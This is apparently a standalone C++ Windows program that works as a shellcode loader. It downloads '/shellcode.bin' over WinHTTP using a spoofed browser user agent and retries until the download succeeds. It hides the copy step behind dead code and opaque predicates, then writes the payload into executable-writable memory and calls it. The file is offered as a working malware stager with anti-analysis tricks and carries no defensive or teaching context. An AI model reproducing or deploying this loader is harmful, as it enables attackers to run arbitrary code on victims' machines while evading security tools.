#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <Windows.h>
#include <iostream>
#include <vector>
#include <ctime>
#include <functional>
#include <thread>
#pragma comment(lib,"winhttp.lib")
#pragma warning(disable:4996)

typedef struct Params {
    LPVOID pBaseAddress;
} PARAMS;

typedef VOID(*fprun)(PARAMS pParams);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    std::wstring serverName = L"127.0.0.1";
    std::wstring objectName = L"/shellcode.bin";

    auto dead_code = []() {
        volatile int x = rand();
        volatile int y = rand();
        volatile int z = x * y;
    };

    auto opaque_predicate = [](bool condition) {
        return (rand() % 2 == 0) || condition;
    };

    auto obfuscate = [&](std::function<void()> func) {
        int random = rand() % 4;
        switch (random) {
            case 0: func(); break;
            case 1: func(); dead_code(); break;
            case 2: if (opaque_predicate(true)) { func(); } break;
            case 3: dead_code(); if (opaque_predicate(true)) { func(); } break;
        }
    };

    bool shellcodeFetched = false;
    std::vector<char> PEb;

    while (!shellcodeFetched) {
        HINTERNET hIS = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        HINTERNET hIC = WinHttpConnect(hIS, serverName.c_str(), PORT, 0);
        HINTERNET hIO = WinHttpOpenRequest(hIC, L"GET", objectName.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        WinHttpSendRequest(hIO, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        WinHttpReceiveResponse(hIO, NULL);

        DWORD dS, dD;

        do {
            dS = 0;
            if (!WinHttpQueryDataAvailable(hIO, &dS)) {
                break;
            }

            char* pOB = new char[dS + 1];

            if (!pOB) {
                break;
            }

            ZeroMemory(pOB, dS + 1);

            if (!WinHttpReadData(hIO, (LPVOID)pOB, dS, &dD)) {
                delete[] pOB;
                break;
            }

            obfuscate([&]() {
                PEb.insert(PEb.end(), pOB, pOB + dS);
            });

            delete[] pOB;
        } while (dS > 0);

        if (!PEb.empty()) {
            shellcodeFetched = true;
        } else {
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
    }

    char* PE = (char*)malloc(PEb.size());
    for (int i = 0; i < PEb.size(); i++) {
        PE[i] = PEb[i];
    }

    PARAMS pParams;
    pParams.pBaseAddress = VirtualAlloc(NULL, PEb.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(pParams.pBaseAddress, PE, PEb.size());

    fprun run = (fprun)pParams.pBaseAddress;
    run(pParams);

    return 0;
}
